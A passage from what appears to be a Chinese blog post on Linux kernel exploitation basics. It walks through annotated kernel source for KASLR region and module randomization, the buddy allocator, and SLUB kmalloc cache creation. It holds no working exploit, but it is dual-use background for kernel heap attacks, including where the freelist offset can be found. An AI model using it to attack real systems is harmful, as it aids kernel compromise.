ARRAY_SIZE(kaslr_regions); i++)</span><br><span class="line">		remain_entropy -= get_padding(&amp;kaslr_regions[i]); <span class="comment">// 减去每个区域的填充</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用从KASLR获取的随机数初始化随机状态</span></span><br><span class="line">	prandom_seed_state(&amp;rand_state, kaslr_get_random_long(<span class="string">&quot;Memory&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历每个内存区域，进行随机化</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(kaslr_regions); i++) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> entropy;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 使用剩余的熵来选择一个随机的虚拟地址。</span></span><br><span class="line"><span class="comment">		 * 熵值是剩余熵除以剩余区域数，确保每个区域有足够的随机空间。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		entropy = remain_entropy / (ARRAY_SIZE(kaslr_regions) - i);</span><br><span class="line">		prandom_bytes_state(&amp;rand_state, &amp;rand, <span class="keyword">sizeof</span>(rand)); <span class="comment">// 生成随机数</span></span><br><span class="line">		<span class="keyword">if</span> (pgtable_l5_enabled())</span><br><span class="line">			entropy = (rand % (entropy + <span class="number">1</span>)) &amp; P4D_MASK; <span class="comment">// 如果启用五级页表，应用P4D对齐掩码</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			entropy = (rand % (entropy + <span class="number">1</span>)) &amp; PUD_MASK; <span class="comment">// 否则，应用PUD对齐掩码</span></span><br><span class="line">		vaddr += entropy; <span class="comment">// 在当前虚拟地址基础上增加随机偏移量</span></span><br><span class="line">		*kaslr_regions[i].base = vaddr; <span class="comment">// 更新内存区域的基地址</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 跳过当前区域，并根据随机化对齐要求添加最小填充。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		vaddr += get_padding(&amp;kaslr_regions[i]); <span class="comment">// 增加填充</span></span><br><span class="line">		<span class="keyword">if</span> (pgtable_l5_enabled())</span><br><span class="line">			vaddr = round_up(vaddr + <span class="number">1</span>, P4D_SIZE); <span class="comment">// 如果启用五级页表，按P4D大小对齐</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			vaddr = round_up(vaddr + <span class="number">1</span>, PUD_SIZE); <span class="comment">// 否则，按PUD大小对齐</span></span><br><span class="line">		remain_entropy -= entropy; <span class="comment">// 减少已使用的熵</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="内核模块地址随机化"><a href="#内核模块地址随机化" class="headerlink" title="内核模块地址随机化"></a>内核模块地址随机化</h4><p>如果 <code>boot_params.hdr.loadflags</code> 的 <code>KASLR_FLAG</code> 标志位置位，则 <code>get_module_load_offset</code> 函数返回值为 <code>0x1000</code> 的整数倍，范围为 <code>0x1000</code> 到 <code>0x400000</code>。另外需要注意 <code>module_load_offset</code> 只被初始化一次，也就是说 <code>get_module_load_offset</code> 返回的结果总是相同的。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 判断KASLR是否启用。</span></span><br><span class="line"><span class="comment"> * 通过检查启动参数中的标志位 `loadflags` 是否设置了 `KASLR_FLAG` 来确定KASLR是否启用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">kaslr_enabled</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !!(boot_params.hdr.loadflags &amp; KASLR_FLAG);  <span class="comment">// 如果设置了KASLR_FLAG，返回true，表示KASLR启用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RANDOMIZE_BASE</span></span><br><span class="line"><span class="comment">// 用于存储模块加载的偏移量</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> module_load_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 互斥锁用于保护module_load_offset的访问。 */</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_MUTEX</span><span class="params">(module_kaslr_mutex)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 获取模块加载的偏移量。</span></span><br><span class="line"><span class="comment"> * 如果启用了KASLR（通过kaslr_enabled()检查），则计算一个随机的偏移量，</span></span><br><span class="line"><span class="comment"> * 该偏移量在系统重启之前保持不变。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">get_module_load_offset</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (kaslr_enabled()) &#123;  <span class="comment">// 如果KASLR启用</span></span><br><span class="line">        mutex_lock(&amp;module_kaslr_mutex);  <span class="comment">// 获取互斥锁，防止并发修改模块加载偏移量</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果这是第一次调用该函数，计算模块加载的偏移量。</span></span><br><span class="line"><span class="comment">         * 计算后，偏移量保持不变，直到系统重启。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (module_load_offset == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 随机计算模块加载偏移量，范围是1到1024倍的页面大小</span></span><br><span class="line">            module_load_offset = (get_random_int() % <span class="number">1024</span> + <span class="number">1</span>) * PAGE_SIZE;</span><br><span class="line">        mutex_unlock(&amp;module_kaslr_mutex);  <span class="comment">// 释放互斥锁</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> module_load_offset;  <span class="comment">// 返回模块加载的偏移量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果未启用KASLR，模块加载的偏移量为0。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">get_module_load_offset</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 如果KASLR未启用，返回0表示不进行随机化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<h3 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/49fb3d6cbe9fed7e2280b4b4a6f20bad.png"
                     
                ><br>buddy system 中内存管理的一个例子：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/b208933c9362745faccf49d8f545ae8d.png"
                     
                ><br>这个例子中，分配的最小单位是64K，初始时的最大块order&#x3D;4. 依次进行下面的操作</p>
<ul>
<li>初始状态</li>
<li>分配块A 34K, order&#x3D;0.<ul>
<li>没有order为0的块，切分order&#x3D;4的块为2个order&#x3D;3的块.</li>
<li>仍然没有order&#x3D;0的块，再切分order&#x3D;3的块.</li>
<li>仍然没有order&#x3D;0的块，再切分order&#x3D;2的块.</li>
<li>仍然没有order&#x3D;0的块，再切分order&#x3D;1的块.</li>
<li>将order&#x3D;0的块返回.</li>
</ul>
</li>
<li>分配块B 66K, order&#x3D;1. 已经有了，直接返回.</li>
<li>分配块C 35K, order&#x3D;0. 也已经有了，直接返回.</li>
<li>分配块D 67K, order&#x3D;1. 切分一个order&#x3D;2的块，返回.</li>
<li>块B释放.</li>
<li>块D释放，因为与其后面的order&#x3D;1的块是第5步分裂得来的，再将其合并为order&#x3D;2的块.</li>
<li>块A释放.</li>
<li>块C释放，依次合并.</li>
</ul>
<h3 id="slub"><a href="#slub" class="headerlink" title="slub"></a>slub</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a7b2a1a75b2154f05c6763d98d2c3eb7.png"
                      alt="img"
                ></p>
<h4 id="关于-object"><a href="#关于-object" class="headerlink" title="关于 object"></a>关于 object</h4><p>slab 以页为基本单位切割，然后用单向链表(fd指针)串起来，类似用户态堆的 fastbin，每一个小块我们叫它 object 。</p>
<p><strong>注意：object 的 freelist 指针偏移是 kmem_cache.offset 而不是 0，虽然大多数情况 kmem_cache.offset 默认为 0 。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>object 结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/80fbfc5452e6ee425f7676a492aef25a.png"
                     
                ></p>
<h4 id="kmem-cache-创建"><a href="#kmem-cache-创建" class="headerlink" title="kmem_cache 创建"></a>kmem_cache 创建</h4><p>slub 分配器把伙伴系统提供的内存内存切割成特定大小的块，进行内核的小内存分配。</p>
<p>具体来说，内核会预先定义一些 <code>kmem_cache</code> 结构体，它保存着要如何分割使用内存页的信息，可以通过 <code>cat /proc/slabinfo</code> 查看系统当前可用的 <code>kmem_cache</code> 。</p>
<p>内核很多的结构体会频繁的申请和释放内存，用 <code>kmem_cache</code> 来管理特定的结构体所需要申请的内存效率上就会比较高，也比较节省内存。默认会创建 <code>kmalloc-8k</code> ，<code>kmalloc-4k</code>，… ，<code>kmalloc-16</code> ，<code>kmalloc-8</code> 这样的 cache ，<code>kmem_cache</code> 的名称以及大小使用 <code>struct kmalloc_info_struct</code> 管理。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                        <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样内核调用 <code>kmalloc</code> 函数时就可以根据申请的内存大小找到对应的 <code>kmalloc-xx</code> ，然后在里面找可可用的内存块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>

<p>创建默认的 <code>kmem_cache</code> 过程存在如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x86_64_start_kernel()</span><br><span class="line">    x86_64_start_reservations()</span><br><span class="line">        start_kernel()</span><br><span class="line">            mm_init()</span><br><span class="line">                kmem_cache_init()</span><br><span class="line">                    create_kmalloc_caches()</span><br><span class="line">                        new_kmalloc_cache()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>new_kmalloc_cache</code> 中根据 <code>kmalloc_info</code> 的信息创建对应的 <code>kmalloc_cache</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init</span><br><span class="line"><span class="title function_">new_kmalloc_cache</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> type, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == KMALLOC_RECLAIM) &#123;</span><br><span class="line">		flags |= SLAB_RECLAIM_ACCOUNT;</span><br><span class="line">		name = kmalloc_cache_name(<span class="string">&quot;kmalloc-rcl&quot;</span>,</span><br><span class="line">						kmalloc_info[idx].size);</span><br><span class="line">		BUG_ON(!name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		name = kmalloc_info[idx].name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kmalloc_caches[type][idx] = create_kmalloc_cache(name,</span><br><span class="line">					kmalloc_info[idx].size, flags, <span class="number">0</span>,</span><br><span class="line">					kmalloc_info[idx].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看到默认创建的 <code>kmem_cache</code> 的地址被保存在 <code>kmalloc_caches</code> 因此可以通过该结构获得 <code>kmem_cache</code> 的地址，从而获取到重要调试信息，比如 <code>freelist</code> 在 <code>object</code> 中的偏移 <code>offset</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8bced970f845702c22749e86041eda02.png"
                     
                ></p>
<p><code>create_kmalloc_cache</code> 函数调用了核心函数 <code>create_boot_cache</code> ，之后 <code>list_add</code> 将创建的 <code>kmem_cache</code> 加入到 <code>slab_caches</code> 链表中。内核全局有一个 <code>slab_caches</code> 变量，它是一个链表，系统所有的 <code>kmem_cache</code> 都接在这个链表上。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *__init <span class="title function_">create_kmalloc_cache</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> kmem_cache_zalloc(kmem_cache, GFP_NOWAIT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		panic(<span class="string">&quot;Out of memory when creating slab %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">	create_boot_cache(s, name, size, flags, useroffset, usersize);</span><br><span class="line">	list_add(&amp;s-&gt;<span class="built_in">list</span>, &amp;slab_caches);</span><br><span class="line">	memcg_link_cache(s);</span><br><span class="line">	s-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>create_boot_cache</code> 初始化了相关信息，之后调用 <code>__kmem_cache_create</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">create_boot_cache</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	s-&gt;name = name;</span><br><span class="line">	s-&gt;size = s-&gt;object_size = size;</span><br><span class="line">	s-&gt;align = calculate_alignment(flags, ARCH_KMALLOC_MINALIGN, size);</span><br><span class="line">	s-&gt;useroffset = useroffset;</span><br><span class="line">	s-&gt;usersize = usersize;</span><br><span class="line"></span><br><span class="line">	slab_init_memcg_params(s);</span><br><span class="line"></span><br><span class="line">	err = __kmem_cache_create(s, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		panic(<span class="string">&quot;Creation of kmalloc slab %s size=%u failed. Reason %d\n&quot;</span>,</span><br><span class="line">					name, size, err);</span><br><span class="line"></span><br><span class="line">	s-&gt;refcount = <span class="number">-1</span>;	<span class="comment">/* Exempt from merging for now */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>__kmem_cache_create</code> 调用了 <code>kmem_cache_open</code> 函数，该函数做了很多重要的初始化操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 